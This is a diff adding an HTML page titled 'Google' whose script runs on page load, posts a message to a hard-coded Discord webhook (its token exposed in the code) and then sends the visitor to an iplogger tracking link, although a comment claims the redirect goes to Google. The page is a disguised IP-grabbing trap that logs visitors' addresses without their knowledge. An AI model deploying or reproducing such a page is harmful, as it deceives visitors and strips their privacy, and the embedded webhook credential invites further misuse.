@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+</head>
+<body>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+            var webhookUrl = 'https://discord.com/api/webhooks/1187410035886784664/D9NoKLMBdQY8imFbXoAyBenCLKU67e1pG2nS2YMKTQWnA-yPZ0WT0k3uvGp8fuBbT720';
+
+            // Create a payload for the webhook
+            var payload = {
+                content: 'https://iplogger.org/logger/qWmm4h6exsSv/ po ip itd',
+            };
+
+            // Send a POST request to the Discord webhook URL
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send webhook:', response.statusText);
+                    } else {
+                        // After the webhook is sent successfully, redirect to Google
+                        window.location.href = 'https://iplogger.com/2XDBR4';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending webhook:', error);
+                });
+        });
+    </script>
+
+</body>
+</html>
+
